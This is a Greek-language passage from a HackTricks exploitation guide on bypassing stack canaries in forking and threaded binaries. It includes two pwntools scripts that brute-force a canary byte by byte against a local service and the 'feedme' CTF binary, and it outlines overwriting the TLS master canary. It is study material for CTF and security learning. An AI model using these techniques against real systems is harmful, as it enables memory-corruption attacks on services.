# BF Forked & Threaded Stack Canaries

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

**Αν αντιμετωπίζετε ένα δυαδικό αρχείο που προστατεύεται από ένα canary και PIE (Position Independent Executable) πιθανότατα χρειάζεται να βρείτε έναν τρόπο να τα παρακάμψετε.**

![](<../../../.gitbook/assets/image (865).png>)

{% hint style="info" %}
Σημειώστε ότι **`checksec`** μπορεί να μην εντοπίσει ότι ένα δυαδικό αρχείο προστατεύεται από ένα canary αν αυτό έχει στατικά μεταγλωττιστεί και δεν είναι ικανό να εντοπίσει τη λειτουργία.\
Ωστόσο, μπορείτε να το παρατηρήσετε χειροκίνητα αν βρείτε ότι μια τιμή αποθηκεύεται στη στοίβα στην αρχή μιας κλήσης λειτουργίας και αυτή η τιμή ελέγχεται πριν την έξοδο.
{% endhint %}

## Brute force Canary

Ο καλύτερος τρόπος για να παρακάμψετε ένα απλό canary είναι αν το δυαδικό αρχείο είναι ένα πρόγραμμα **που δημιουργεί παιδικές διεργασίες κάθε φορά που καθορίζετε μια νέα σύνδεση** με αυτό (υπηρεσία δικτύου), επειδή κάθε φορά που συνδέεστε σε αυτό **το ίδιο canary θα χρησιμοποιείται**.

Έτσι, ο καλύτερος τρόπος για να παρακάμψετε το canary είναι απλά να **το παρακάμψετε με brute-force χαρακτήρα προς χαρακτήρα**, και μπορείτε να καταλάβετε αν το μαντεμένο byte του canary ήταν σωστό ελέγχοντας αν το πρόγραμμα έχει καταρρεύσει ή συνεχίζει τη κανονική του ροή. Σε αυτό το παράδειγμα η λειτουργία **παρακάμπτει ένα canary 8 Bytes (x64)** και διακρίνει μεταξύ ενός σωστά μαντεμένου byte και ενός κακού byte απλά **ελέγχοντας** αν μια **απάντηση** επιστρέφεται από τον διακομιστή (ένας άλλος τρόπος σε **άλλη περίπτωση** θα μπορούσε να είναι η χρήση ενός **try/except**):

### Παράδειγμα 1

Αυτό το παράδειγμα έχει υλοποιηθεί για 64 bits αλλά θα μπορούσε να υλοποιηθεί εύκολα και για 32 bits.
```python
from pwn import *

def connect():
r = remote("localhost", 8788)

def get_bf(base):
canary = ""
guess = 0x0
base += canary

while len(canary) < 8:
while guess != 0xff:
r = connect()

r.recvuntil("Username: ")
r.send(base + chr(guess))

if "SOME OUTPUT" in r.clean():
print "Guessed correct byte:", format(guess, '02x')
canary += chr(guess)
base += chr(guess)
guess = 0x0
r.close()
break
else:
guess += 1
r.close()

print "FOUND:\\x" + '\\x'.join("{:02x}".format(ord(c)) for c in canary)
return base

canary_offset = 1176
base = "A" * canary_offset
print("Brute-Forcing canary")
base_canary = get_bf(base) #Get yunk data + canary
CANARY = u64(base_can[len(base_canary)-8:]) #Get the canary
```
### Example 2

Αυτό έχει υλοποιηθεί για 32 bits, αλλά αυτό θα μπορούσε να αλλάξει εύκολα σε 64 bits.\
Επίσης σημειώστε ότι για αυτό το παράδειγμα το **πρόγραμμα αναμένει πρώτα ένα byte για να υποδείξει το μέγεθος της εισόδου** και το payload.
```python
from pwn import *

# Here is the function to brute force the canary
def breakCanary():
known_canary = b""
test_canary = 0x0
len_bytes_to_read = 0x21

for j in range(0, 4):
# Iterate up to 0xff times to brute force all posible values for byte
for test_canary in range(0xff):
print(f"\rTrying canary: {known_canary} {test_canary.to_bytes(1, 'little')}", end="")

# Send the current input size
target.send(len_bytes_to_read.to_bytes(1, "little"))

# Send this iterations canary
target.send(b"0"*0x20 + known_canary + test_canary.to_bytes(1, "little"))

# Scan in the output, determine if we have a correct value
output = target.recvuntil(b"exit.")
if b"YUM" in output:
# If we have a correct value, record the canary value, reset the canary value, and move on
print(" - next byte is: " + hex(test_canary))
known_canary = known_canary + test_canary.to_bytes(1, "little")
len_bytes_to_read += 1
break

# Return the canary
return known_canary

# Start the target process
target = process('./feedme')
#gdb.attach(target)

# Brute force the canary
canary = breakCanary()
log.info(f"The canary is: {canary}")
```
## Threads

Τα νήματα της ίδιας διαδικασίας θα **μοιράζονται το ίδιο καναρί** και επομένως θα είναι δυνατό να **brute-forc**e ένα καναρί αν το δυαδικό δημιουργεί ένα νέο νήμα κάθε φορά που συμβαίνει μια επίθεση.&#x20;

Επιπλέον, μια **υπερχείλιση buffer σε μια θρεμμένη συνάρτηση** που προστατεύεται με καναρί θα μπορούσε να χρησιμοποιηθεί για να **τροποποιήσει το κύριο καναρί που αποθηκεύεται στο TLS**. Αυτό συμβαίνει επειδή, μπορεί να είναι δυνατό να φτάσουμε στη θέση μνήμης όπου αποθηκεύεται το TLS (και επομένως, το καναρί) μέσω μιας **bof στο στοίβα** ενός νήματος.\
Ως αποτέλεσμα, η μείωση είναι άχρηστη επειδή ο έλεγχος χρησιμοποιείται με δύο καναρί που είναι τα ίδια (αν και τροποποιημένα).\
Αυτή η επίθεση εκτελείται στην αναφορά: [http://7rocky.github.io/en/ctf/htb-challenges/pwn/robot-factory/#canaries-and-threads](http://7rocky.github.io/en/ctf/htb-challenges/pwn/robot-factory/#canaries-and-threads)

Ελέγξτε επίσης την παρουσίαση του [https://www.slideshare.net/codeblue\_jp/master-canary-forging-by-yuki-koike-code-blue-2015](https://www.slideshare.net/codeblue\_jp/master-canary-forging-by-yuki-koike-code-blue-2015) που αναφέρει ότι συνήθως το **TLS** αποθηκεύεται με **`mmap`** και όταν δημιουργείται μια **στοίβα** ενός **νήματος** δημιουργείται επίσης με `mmap` σύμφωνα με αυτό, το οποίο μπορεί να επιτρέπει την υπερχείλιση όπως φαίνεται στην προηγούμενη αναφορά.

## Other examples & references

* [https://guyinatuxedo.github.io/07-bof\_static/dcquals16\_feedme/index.html](https://guyinatuxedo.github.io/07-bof\_static/dcquals16\_feedme/index.html)
* 64 bits, no PIE, nx, BF canary, write in some memory a ROP to call `execve` and jump there.
